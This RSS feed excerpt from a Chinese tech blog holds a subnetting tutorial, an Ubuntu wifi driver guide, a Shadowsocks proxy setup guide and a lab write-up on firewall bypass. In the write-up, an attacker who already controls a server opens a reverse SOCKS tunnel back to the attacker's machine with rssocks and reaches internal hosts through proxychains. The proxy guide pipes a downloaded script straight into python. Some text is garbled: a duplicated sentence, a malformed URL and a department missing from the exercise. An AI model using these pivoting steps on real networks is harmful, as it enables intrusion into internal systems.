<h3 id="c-类地址" tabindex="-1"> C 类地址</h3>
<ul>
<li>C 类地址第 1 字节、第 2 字节和第 3 个字节为网络地址, 第 4 个个字节为主机地址。另外第 1 个字节的前三位固定为 <code>110</code></li>
<li>C 类地址范围: <code>192.0.0.1</code> -- <code>223.255.255.254</code></li>
<li>C 类地址中的私有地址:</li>
</ul>
<p>-- <code>192.168.X.X</code> 是私有地址</p>
<ul>
<li>最大的网络数: <code>2^21-2</code> , 网络中最大的主机数: <code>2^8-2</code></li>
</ul>
<h3 id="d-类地址" tabindex="-1"> D 类地址</h3>
<ul>
<li>D 类地址不分网络地址和主机地址, 它的第 1 个字节的前四位固定为 <code>1110</code></li>
<li>D 类地址范围: <code>224.0.0.1</code> -- <code>239.255.255.254</code></li>
</ul>
<h3 id="e-类地址" tabindex="-1"> E 类地址</h3>
<ul>
<li>E 类地址也不分网络地址和主机地址, 它的第 1 个字节的前五位固定为 <code>11110</code></li>
<li>E 类地址范围: <code>240.0.0.1</code> -- <code>255.255.255.254</code></li>
</ul>
<h2 id="c-类-ip-地址规划" tabindex="-1"> C 类 IP 地址规划</h2>
<h3 id="首先-准确的记住-2-1-2-8-的得数" tabindex="-1"> 首先, 准确的记住 2^1 ~ 2^8 的得数</h3>
<div><pre><code>2^1 = 2
2^2 = 4
2^3 = 8
2^4 = 16
2^5 = 32
2^6 = 64
2^7 = 128
2^8 = 256
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="地址划分" tabindex="-1"> 地址划分</h3>
<p>划分时要么根据主机数来划分；要么根据子网数来划分。</p>
<h4 id="第一种情况" tabindex="-1"> 第一种情况</h4>
<p>已知 IP 地址段和子网个数, 求子网的规划</p>
<div><pre><code>已知,某公司总部申请到 200.200.200.0 网段,该公司总部有三个部门。
每个部门都将拥有属于该部门的子网,写出每个部门将会分配到的IP地址段（包含网络地址和广播地址）。
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>解析: 要划分 3 个子网, 那么 2^n&gt;=3 , 得出 n&gt;=2 , 取 n=2 , 即 2^2=4 , 可以划分四个子网。每个子网有 2^(8-2)-2=62 个主机。广播号等于网络号加 (2^(8-2)-1), 子网掩码为 24+2=26。</p>
<p><code>答案: </code></p>
<div><pre><code>四个子网分别是:

A: 200.200.200.0/26 ~ 200.200.200.63/26
B: 200.200.200.64/26 ~ 200.200.200.127/26
C: 200.200.200.128/26 ~ 200.200.200.191/26
D: 200.200.200.192/26 ~ 200.200.200.255/26
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="第二种情况" tabindex="-1"> 第二种情况</h4>
<p>已知 IP 地址段和各子网的主机个数, 求子网规划</p>
<div><pre><code>已知,某公司总部申请到 200.200.200.0 网段,该公司总部有三个部门,
分别是 A 部们、B 部门、 C 部门,
其中 A 部门有 100 台电脑,B 部门有 48 台电脑,C 部门有 50 台电脑,
写出每个部门将会分配到的 IP 地址段（包含网络地址和广播地址）。
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>解析: 要划分 3 个子网, 第一个子网有 100 台主机, 那么 2^n&gt;=100, 得出 n&gt;=7, 则该子网总共能容纳主机数为 2^7-2=126。广播号等于网络号加上 (2^7-1), 该子网的掩码为 32-7=25。以此类推。</p>
<p><code>答案: </code></p>
<div><pre><code>三个子网分别是:

A: 200.200.200.0/25 ~ 200.200.200.127/25
B: 200.200.200.128/26 ~ 200.200.200.191/26
C: 200.200.200.192/26 ~ 200.200.200.255/26
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="ip-地址规划练习" tabindex="-1"> IP 地址规划练习</h3>
<div><pre><code>已知, 某公司总部申请到 211.91 .5 .0 网段, 该公司总部有六个部门,
每个部门对应的电脑台数分别是 A 部门 100 台、 B 部门 50 台、 C 部门 10 台、 E 部门 10 台、 F 部门 10 台。
写出每个部门将会分配到的 IP 地址段（ 包含网络地址和广播地址）。
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>解析: 要划分 6 个子网, 第一个子网有 100 台主机, 那么 2^n&gt;=100, 得出 n&gt;=7, 则该子网总共能容纳主机数为 2^7-2=126。广播号等于网络号加上 (2^7-1), 该子网的掩码为 32-7=25。以此类推。</p>
<p><code>答案: </code></p>
<div><pre><code>六个子网分别是:

A: 211.91.5.0/25 ~ 211.91.5.127/25
B: 211.91.5.128/26 ~ 211.91.5.191/26
C: 211.91.5.192/28 ~ 211.91.5.207/28
D: 211.91.5.208/28 ~ 211.91.5.223/28
E: 211.91.5.224/28 ~ 211.91.5.239/28
F: 211.91.5.240/28 ~ 211.91.5.255/28
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Socks 代理反弹突破内网</title>
      <link>https://vxhly.github.io/views/networking/socks-proxy-rebound.html</link>
      <guid>https://vxhly.github.io/views/networking/socks-proxy-rebound.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Socks 代理反弹突破内网</source>
      <description>前言
对于渗透测试者来说, 如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题, 本文介绍了在夺取映射到外网的内网服务器权限后, 如何利用 Socks 代理反弹获得内网访问权限。

</description>
      <category>networking</category>
      <pubDate>Thu, 24 Nov 2016 14:46:22 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>对于渗透测试者来说, 如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题, 本文介绍了在夺取映射到外网的内网服务器权限后, 如何利用 Socks 代理反弹获得内网访问权限。</p>
</div>

<h2 id="环境介绍" tabindex="-1"> 环境介绍</h2>
<table>
<thead>
<tr>
<th>机子</th>
<th>系统</th>
<th>IP</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击机</td>
<td><code>kali Liunx</code></td>
<td>192.168.199.130 (外网)</td>
</tr>
<tr>
<td>目标主机</td>
<td><code>ubuntu-server</code></td>
<td>192.168.199.131 (外网)；192.168.235.143 (内网)</td>
</tr>
<tr>
<td>内网主机</td>
<td><code>Metasploitable2-Liunx</code></td>
<td>192.168.235.142 (内网)</td>
</tr>
</tbody>
</table>
<h2 id="工具介绍" tabindex="-1"> 工具介绍</h2>
<h3 id="ssocks" tabindex="-1"> sSocks</h3>
<p>sSocks 是一个 socks 代理工具套装, 可用来开启 socks 代理服务, 支持 socks5 验证, 支持 IPV6 和 UDP, 并提供反向 socks 代理服务, 即将远程计算机作为 socks 代理服务端, 反弹回本地, 极大方便内网的渗透测试</p>
<h3 id="下载" tabindex="-1"> 下载</h3>
<p><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener noreferrer">sSocks 更新地址</a><br> 这里下载的版本为 <code>0.0.14</code></p>
<div><pre><code><span>wget</span> https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="解压并编译" tabindex="-1"> 解压并编译</h3>
<div><pre><code><span>tar</span> -xzvf ssocks-0.0.14.tar.gz
<span>cd</span> ssocks-0.0.14
./configure <span>&amp;&amp;</span> <span>make</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>注意</p>
<p>编译的时候要先确定机子上有 gcc 环境, 没有的请自行安装</p>
</div>
<h3 id="功能" tabindex="-1"> 功能</h3>
<p>编译完成, 进入 sr c 目录, 会发现有 <code>nsocks</code> 、 <code>ssocksd</code> 、 <code>ssocks</code> 、 <code>rcsocks</code> , 其功能说明介绍如下:</p>
<ul>
<li><strong>nsocks</strong> 类似通过 Socks5 代理后的 netcat, 可用来测试 socks server</li>
<li><strong>ssocksd</strong> 用来开启 Socks5 代理服务</li>
<li><strong>ssocks</strong> 本地启用 Socks5 服务, 并反弹到另一 IP 地址</li>
<li><strong>rcsocks</strong> 接收反弹过来的 Socks5 服务, 并转向另一端口</li>
</ul>
<h2 id="攻击步骤" tabindex="-1"> 攻击步骤</h2>
<p>现假设已获得 <code>ubuntu-server</code> 权限, 也将 ssocks 这软件上传至该服务器（包含解压和编译）</p>
<h3 id="执行本地监听" tabindex="-1"> 执行本地监听</h3>
<p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p>
<div><pre><code><span>cd</span> ssocks-0.0.14/src
./rcsocks -l <span>1088</span> -p <span>1080</span> -vv
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>等待远程 Socks5 服务器访问本地 1080 端口, 创建端口 1080 与本地端口 1088 的连接通道<br></p>
<p><img src="/assets/socks-proxy-1.png" alt="Socks 代理"></p>
<h3 id="开启-socks5-代理服务-反弹" tabindex="-1"> 开启 Socks5 代理服务, 反弹</h3>
<p>机子: <code>ubuntu-server</code> ；IP: <code>192.168.199.131</code></p>
<div><pre><code><span>cd</span> ssocks-0.0.14/src
./rssocks -vv -s <span>192.168</span>.199.130:1080
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>启用 Socks5 服务, 反弹到 <code>192.168.199.130</code> （即 <code>kali Liunx</code> ） 的端口 1080 上<br></p>
<p><img src="/assets/socks-proxy-2.png" alt="Socks 代理"></p>
<p>此时在渗透测试端 <code>192.168.199.130</code> （即 <code>kali Liunx</code> ） 可看到通道连接成功<br></p>
<p><img src="/assets/socks-proxy-3.png" alt="Socks 代理"></p>
<h3 id="利用-proxychains-进行-socks5-代理" tabindex="-1"> 利用 proxychains 进行 Socks5 代理</h3>
<p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p>
<h4 id="proxychains-介绍" tabindex="-1"> proxychains 介绍</h4>
<p>通过前面的步骤, Socks5 代理已创建完成了。由于在渗透测试过程中, 需要使用不同的工具程序, 而在各程序中分别配置 Socks5 代理信息较为繁琐, 而部分程序并不支持配置 Socks5 代理。为了简化这些操作, 我们可以采用 <code>proxychains</code> 。</p>
<p>proxychains 是一个代理客户端软件, 可以支持几乎所有程序的代理, 如 <code>ssh</code> , <code>telnet</code> , <code>ftp</code> 等。利用 <code>proxychains</code> , 程序能在代理的环境下被加载运行, 而本身不需要具备代理功能。</p>
<h4 id="proxychains-下载" tabindex="-1"> proxychains 下载</h4>
<p>需要 git 环境, 在 <code>kali Liunx</code> 使用 <code>proxychains</code></p>
<div><pre><code><span>git</span> clone https://github.com/haad/proxychains.git
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="编译和安装" tabindex="-1"> 编译和安装</h4>
<div><pre><code><span>cd</span> proxychains
./configure
<span>make</span> <span>&amp;&amp;</span> <span>make</span> <span>install</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="修改配置文件" tabindex="-1"> 修改配置文件</h4>
<p>使用前需要对 proxychains 进行简单配置, 打开配置文件 <code>/etc/proxychains.conf</code> 在 <code>[ProxyList]</code> 处添加</p>
<div><pre><code>socks5 <span>127.0</span>.0.1 <span>1088</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/socks-proxy-4.png" alt="Socks 代理"></p>
<p>配置成功后若要启动程序, 仅需要在启动程序命令前加上 <code>proxychains</code></p>
<h3 id="启用浏览器-firefox" tabindex="-1"> 启用浏览器 firefox</h3>
<p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p>
<div><pre><code>proxychains firefox
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/socks-proxy-5.png" alt="Socks 代理"></p>
<h3 id="访问内网机子" tabindex="-1"> 访问内网机子</h3>
<p>机子: <code>kali Liunx</code> ；IP: <code>192.168.235.143</code></p>
<div><p>注意</p>
<p>现在已经可以直接访问内网主机了, IP: <code>192.168.235.142</code></p>
</div>
<p><img src="/assets/socks-proxy-6.png" alt="Socks 代理"></p>
<p>随便点个链接, 然后再看一眼 <code>ubuntu-server</code> 中的日志, 成功访问到内网中的页面<br></p>
<p><img src="/assets/socks-proxy-7.png" alt="Socks 代理"></p>
<h2 id="后记" tabindex="-1"> 后记</h2>
<p>由于系统管理员的疏忽或者业务需求所致, 防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此, 在此种情况下, 通过攻陷映射到公网的端口服务, 利用反弹便可获取内网访问权限, 给内网安全带来极大的威胁。在信息安全建设与运维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁 � 维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁</p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/socks-proxy-1.png" type="image/png"/>
    </item>
    <item>
      <title>Ubuntu 下连接 WIFI</title>
      <link>https://vxhly.github.io/views/networking/ubuntu-connect-wifi.html</link>
      <guid>https://vxhly.github.io/views/networking/ubuntu-connect-wifi.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Ubuntu 下连接 WIFI</source>
      <description>前言
基于已经安装双系统, 或是只有 Ubuntu 系统, 在虚拟机下不存在此问题。

</description>
      <category>networking</category>
      <pubDate>Mon, 01 Aug 2016 12:24:19 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>基于已经安装双系统, 或是只有 Ubuntu 系统, 在虚拟机下不存在此问题。</p>
</div>

<h2 id="查看无线网卡信息" tabindex="-1"> 查看无线网卡信息</h2>
<div><pre><code>lspci <span>|</span> <span>grep</span> -i network
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="下载无线网卡驱动" tabindex="-1"> 下载无线网卡驱动</h2>
<p>本人的无线网卡为 <code>Realtek-RTL8723BE</code> 下载地址 <a href="http://oss-blog.test.upcdn.net/rtl8723be.tar.gz?attname=" target="_blank" rel="noopener noreferrer">rtl8723be.tar.gz</a></p>
<h3 id="驱动安装-解压进入目录" tabindex="-1"> 驱动安装(解压进入目录)</h3>
<div><pre><code><span>make</span>
<span>sudo</span> <span>make</span> <span>install</span>
<span>sudo</span> modprobe rtl8723be <span>(</span>rtl8723be 需替换成自己的网卡<span>)</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="设置为开机启动项" tabindex="-1"> 设置为开机启动项</h3>
<div><pre><code><span>sudo</span> modprobe -r rtl8723be <span>(</span>rtl8723be 需替换成自己的网卡<span>)</span>
<span>sudo</span> modprobe rtl8723be <span>(</span>rtl8723be 需替换成自己的网卡<span>)</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="重启网卡" tabindex="-1"> 重启网卡</h3>
<div><pre><code><span>ifconfig</span> wlan0 down
<span>ifconfig</span> wlan0 up
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="重启网络服务" tabindex="-1"> 重启网络服务</h3>
<div><pre><code><span>service</span> network restart
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu 下科学上网</title>
      <link>https://vxhly.github.io/views/networking/ubuntu-over-the-wall.html</link>
      <guid>https://vxhly.github.io/views/networking/ubuntu-over-the-wall.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Ubuntu 下科学上网</source>
      <description>前言
翻墙, 主要用于 npm 的代理。没有 vpn 服务器不要紧, 肯花点小钱就可以搞定访问 高梯子。

</description>
      <category>networking</category>
      <pubDate>Sun, 31 Jul 2016 21:32:24 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>翻墙, 主要用于 npm 的代理。没有 vpn 服务器不要紧, 肯花点小钱就可以搞定访问 <a href="http://www.gaotizi.com/aff.php?aff=133" target="_blank" rel="noopener noreferrer">高梯子</a>。</p>
</div>

<h2 id="方法一" tabindex="-1"> 方法一</h2>
<h3 id="下载-shadowsocks-libev" tabindex="-1"> 下载 shadowsocks-libev</h3>
<p>下载 shadowsocks-libev 安装包, 解压并重命名为 shadowsocks-libev</p>
<p><a href="http://github.com/shadowsocks/shadowsocks-libev/archive/v2.4.6.zip" target="_blank" rel="noopener noreferrer">Source code (zip) 下载地址</a><br> <a href="http://github.com/shadowsocks/shadowsocks-libev/archive/v2.4.6.tar.gz" target="_blank" rel="noopener noreferrer">Source code (tar.gz) 下载地址</a></p>
<h3 id="安装-shadowsocks-libev" tabindex="-1"> 安装 shadowsocks-libev</h3>
<div><pre><code><span>cd</span> shadowsocks-libev
<span>sudo</span> <span>apt-get</span> <span>install</span> build-essential autoconf libtool libssl-dev <span>\</span>
    <span>gawk</span> debhelper dh-systemd init-system-helpers pkg-config
dpkg-buildpackage -us -uc -i
<span>cd</span> <span>..</span>
<span>sudo</span> dpkg -i shadowsocks-libev*.deb
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="建议安装前先更新一下软件列表" tabindex="-1"> 建议安装前先更新一下软件列表</h3>
<p>如果显示 &quot;现在没有可用的软件包&quot; 等字样, 建议先执行</p>
<div><pre><code><span>sudo</span> <span>rm</span> /var/lib/apt/lists/* -vf
<span>sudo</span> <span>apt-get</span> update
<span>sudo</span> <span>apt-get</span> upgrade
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="配置-config-json-文件" tabindex="-1"> 配置 config.json 文件</h3>
<p>使用 <code>vim</code></p>
<div><pre><code><span>sudo</span> <span>vim</span> /etc/shadowsocks-libev/config.json
</code></pre><div aria-hidden="true"><div></div></div></div><p>或者使用 <code>gedit</code></p>
<div><pre><code><span>sudo</span> gedit /etc/shadowsocks-libev/config.json
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="修改服务器地址跟密码" tabindex="-1"> 修改服务器地址跟密码</h3>
<div><pre><code><span>{</span>
  <span>"server"</span><span>:</span> <span>""</span><span>,</span>
  <span>"server_port"</span><span>:</span> <span>8388</span><span>,</span>
  <span>"local_port"</span><span>:</span> <span>1080</span><span>,</span>
  <span>"password"</span><span>:</span> <span>""</span><span>,</span>
  <span>"timeout"</span><span>:</span> <span>60</span><span>,</span>
  <span>"method"</span><span>:</span> <span>"rc4-md5"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="配置-shadowsocks-libev-文件" tabindex="-1"> 配置 shadowsocks-libev 文件</h3>
<p>使用 <code>vim</code></p>
<div><pre><code><span>sudo</span> <span>vim</span> /etc/init.d/shadowsocks-libev
</code></pre><div aria-hidden="true"><div></div></div></div><p>或者使用 <code>gedit</code></p>
<div><pre><code><span>sudo</span> gedit /etc/init.d/shadowsocks-libev
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="修改文件" tabindex="-1"> 修改文件</h3>
<div><pre><code><span>DAEMON</span><span>=</span>/usr/bin/ss-server
</code></pre><div aria-hidden="true"><div></div></div></div><p>=&gt;</p>
<div><pre><code><span>DAEMON</span><span>=</span>/usr/bin/ss-local
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="启动-shadowsocks-libev" tabindex="-1"> 启动 shadowsocks-libev</h3>
<div><pre><code><span>sudo</span> <span>service</span> shadowsocks-libev restart
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装-privoxy" tabindex="-1"> 安装 Privoxy</h3>
<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> privoxy
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="配置-privoxy" tabindex="-1"> 配置 Privoxy</h3>
<p>使用 <code>vim</code></p>
<div><pre><code><span>sudo</span> <span>vim</span> /etc/privoxy/config
</code></pre><div aria-hidden="true"><div></div></div></div><p>或者使用 <code>gedit</code></p>
<div><pre><code><span>sudo</span> gedit /etc/privoxy/config
</code></pre><div aria-hidden="true"><div></div></div></div><p>按 <code>shift+g</code> 切到最后一行, 添加</p>
<div><pre><code>forward-socks5 / <span>127.0</span>.0.1:1080 <span>.</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="配置终端-http-代理" tabindex="-1"> 配置终端 http 代理</h3>
<div><pre><code><span>export</span> <span>http_proxy</span><span>=</span><span>"127.0.0.1:8118"</span>
<span>export</span> <span>https_proxy</span><span>=</span><span>"127.0.0.1:8118"</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="配置终端-http-代理的启动" tabindex="-1"> 配置终端 http 代理的启动</h3>
<p>使用 <code>vim</code></p>
<div><pre><code><span>sudo</span> <span>vim</span> ~/.bashrc
</code></pre><div aria-hidden="true"><div></div></div></div><p>或者使用 <code>gedit</code></p>
<div><pre><code><span>sudo</span> gedit ~/.bashrc
</code></pre><div aria-hidden="true"><div></div></div></div><p>按 <code>shift+g</code> 切到最后一行, 添加</p>
<div><pre><code><span>export</span> <span>http_proxy</span><span>=</span><span>"127.0.0.1:8118"</span>
<span>export</span> <span>https_proxy</span><span>=</span><span>"127.0.0.1:8118"</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>如果此举会影响到终端下载, 建议还是不要设置为好。</p>
<h3 id="启动-privoxy" tabindex="-1"> 启动 Privoxy</h3>
<div><pre><code><span>sudo</span> <span>service</span> privoxy restart
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="测试代理是否成功-需安装-curl" tabindex="-1"> 测试代理是否成功（需安装 curl）</h3>
<div><pre><code><span>curl</span> https:https://www.google.com.hk
</code></pre><div aria-hidden="true"><div></div></div></div><p>返回带 <code>google</code> 字样表示受理成功</p>
<h3 id="配置-npm-代理-需安装-node、npm" tabindex="-1"> 配置 npm 代理（需安装 node、npm）</h3>
<div><pre><code><span>npm</span> config <span>set</span> proxy http://127.0.0.1:8118
<span>npm</span> config <span>set</span> https-proxy http://127.0.0.1:8118
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="清除-npm-代理" tabindex="-1"> 清除 npm 代理</h3>
<div><pre><code><span>npm</span> config delete proxy
<span>npm</span> config delete https-proxy
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="方法二" tabindex="-1"> 方法二</h2>
<h3 id="安装-shadowsocks" tabindex="-1"> 安装 shadowsocks</h3>
<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> python-gevent python-pip python-setuptools m2crypto
<span>sudo</span> pip <span>install</span> shadowsocks
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="建议安装前先更新一下软件列表-1" tabindex="-1"> 建议安装前先更新一下软件列表</h3>
<div><pre><code><span>sudo</span> <span>apt-get</span> update
<span>sudo</span> <span>apt-get</span> upgrade
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="新建-shadowsocks-json-文件" tabindex="-1"> 新建 shadowsocks.json 文件</h3>
<p>使用 <code>vim</code></p>
<div><pre><code><span>sudo</span> <span>vim</span> /etc/shadowsocks.json
</code></pre><div aria-hidden="true"><div></div></div></div><p>或使用 <code>gedit</code></p>
<div><pre><code><span>sudo</span> gedit /etc/shadowsocks.json
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="添加内容" tabindex="-1"> 添加内容</h3>
<div><pre><code><span>{</span>
  <span>"server"</span><span>:</span> <span>""</span><span>,</span>
  <span>"server_port"</span><span>:</span> <span>8388</span><span>,</span>
  <span>"local_port"</span><span>:</span> <span>1080</span><span>,</span>
  <span>"password"</span><span>:</span> <span>""</span><span>,</span>
  <span>"timeout"</span><span>:</span> <span>60</span><span>,</span>
  <span>"method"</span><span>:</span> <span>"rc4-md5"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="启动-shadowsocks" tabindex="-1"> 启动 shadowsocks</h3>
<div><pre><code>sslocal -c /etc/shadowsocks.json
</code></pre><div aria-hidden="true"><div></div></div></div><p>设置为启动时自动运行。在 <code>/etc/rc.local</code> 中添加如下命令, 注意在 <code>exit 0</code> 之前。</p>
<div><pre><code><span>sudo</span> sslocal -c /etc/shadowsocks.json
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装-privoxy-1" tabindex="-1"> 安装 Privoxy</h3>
<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> privoxy
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="配置-privoxy-1" tabindex="-1"> 配置 Privoxy</h3>
<p>使用 <code>vim</code></p>
<div><pre><code><span>sudo</span> <span>vim</span> /etc/privoxy/config
</code></pre><div aria-hidden="true"><div></div></div></div><p>或者使用 <code>gedit</code></p>
<div><pre><code><span>sudo</span> gedit /etc/privoxy/config
</code></pre><div aria-hidden="true"><div></div></div></div><p>修改监听地址</p>
<div><pre><code>listen-address  <span>127.0</span>.0.1:8118
</code></pre><div aria-hidden="true"><div></div></div></div><p>按 <code>shift+g</code> 切到最后一行, 添加</p>
<div><pre><code>forward-socks5 / <span>127.0</span>.0.1:1080 <span>.</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="启动-privoxy-1" tabindex="-1"> 启动 Privoxy</h3>
<div><pre><code><span>sudo</span> /etc/init.d/privoxy restart
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="配置终端-http-代理-1" tabindex="-1"> 配置终端 http 代理</h3>
<div><pre><code><span>export</span> <span>http_proxy</span><span>=</span><span>"127.0.0.1:8118"</span>
<span>export</span> <span>https_proxy</span><span>=</span><span>"127.0.0.1:8118"</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>为了方便还是在 <code>/etc/rc.local</code> 中添加如下命令, 注意在 <code>exit 0</code> 之前。</p>
<div><pre><code><span>sudo</span> /etc/init.d/privoxy start
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="配置终端-http-代理的启动-1" tabindex="-1"> 配置终端 http 代理的启动</h3>
<p>使用 <code>vim</code></p>
<div><pre><code><span>sudo</span> <span>vim</span> ~/.bashrc
</code></pre><div aria-hidden="true"><div></div></div></div><p>或者使用 <code>gedit</code></p>
<div><pre><code><span>sudo</span> gedit ~/.bashrc
</code></pre><div aria-hidden="true"><div></div></div></div><p>按 <code>shift+g</code> 切到最后一行, 添加</p>
<div><pre><code><span>export</span> <span>http_proxy</span><span>=</span><span>"127.0.0.1:8118"</span>
<span>export</span> <span>https_proxy</span><span>=</span><span>"127.0.0.1:8118"</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>如果此举会影响到终端下载, 建议还是不要设置为好。</p>
<h3 id="测试代理是否成功-需安装-curl-1" tabindex="-1"> 测试代理是否成功（需安装 curl）</h3>
<div><pre><code><span>curl</span> https://www.google.com.hk
</code></pre><div aria-hidden="true"><div></div></div></div><p>返回带 <code>google</code> 字样表示受理成功</p>
<h3 id="配置-npm-代理-需安装-node、npm-1" tabindex="-1"> 配置 npm 代理（需安装 node、npm）</h3>
<div><pre><code><span>npm</span> config <span>set</span> proxy http://127.0.0.1:8118
<span>npm</span> config <span>set</span> https-proxy http://127.0.0.1:8118
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="清除-npm-代理-1" tabindex="-1"> 清除 npm 代理</h3>
<div><pre><code><span>npm</span> config delete proxy
<span>npm</span> config delete https-proxy
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="附上-shadowsocks-服务器搭建方法" tabindex="-1"> 附上 Shadowsocks 服务器搭建方法</h2>
<p>首先你要有一台专属于你的服务器, <a href="http://www.hostker.com/" target="_blank" rel="noopener noreferrer">hostker</a> 这里提供较为便宜的服务器</p>
<h3 id="更新软件源" tabindex="-1"> 更新软件源</h3>
<p>安装前最好先更新一下软件源</p>
<div><pre><code><span>sudo</span> <span>apt-get</span> update
<span>sudo</span> <span>apt-get</span> upgrade
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="安装-shadowsocks-服务端" tabindex="-1"> 安装 Shadowsocks 服务端</h3>
<p>使用 <code>pip</code> 方式安装</p>
<div><pre><code><span>apt-get</span> <span>install</span> python-pip
pip <span>install</span> shadowsocks
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>pip 安装时候可能会报错, 执行以下命令再重新安装一次</p>
<div><pre><code><span>wget</span> //bootstrap.pypa.io/ez_setup.py -O - <span>|</span> python
</code></pre><div aria-hidden="true"><div></div></div></div><p>当然你也可以更新一下 <code>pip</code></p>
<div><pre><code>pip <span>install</span> --upgrade pip
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="启动-shadowsocks-服务端" tabindex="-1"> 启动 Shadowsocks 服务端</h3>
<div><pre><code>ssserver -p <span>8388</span> -k password -m rc4-md5 --user nobody -d start
</code></pre><div aria-hidden="true"><div></div></div></div><p>其中 <code>8388</code> 是远程服务器端口, <code>password</code> 是连接密码, <code>rc4-md5</code> 是加密方式</p>
<h3 id="shadowsocks-windows-端" tabindex="-1"> Shadowsocks Windows 端</h3>
<p><a href="http://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener noreferrer">shadowsocks-windows</a></p>
<h2 id="使用-shadowsocks-libev-一键安装脚本" tabindex="-1"> 使用 shadowsocks-libev 一键安装脚本</h2>
<h3 id="默认配置" tabindex="-1"> 默认配置:</h3>
<ul>
<li>服务器端口: <code>8989</code></li>
<li>客户端端口: <code>1080</code></li>
<li>密码: 自己设定（如不设定, 默认为 <code>teddysun.com</code> ）</li>
</ul>
<h3 id="下载安装" tabindex="-1"> 下载安装</h3>
<h4 id="centos-系统" tabindex="-1"> CentOS 系统</h4>
<div><pre><code><span>wget</span> --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev.sh
<span>chmod</span> +x shadowsocks-libev.sh
./shadowsocks-libev.sh <span><span>2</span>></span><span>&amp;1</span> <span>|</span> <span>tee</span> shadowsocks-libev.log
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="ubuntu-debian-系统" tabindex="-1"> Ubuntu, Debian 系统</h4>
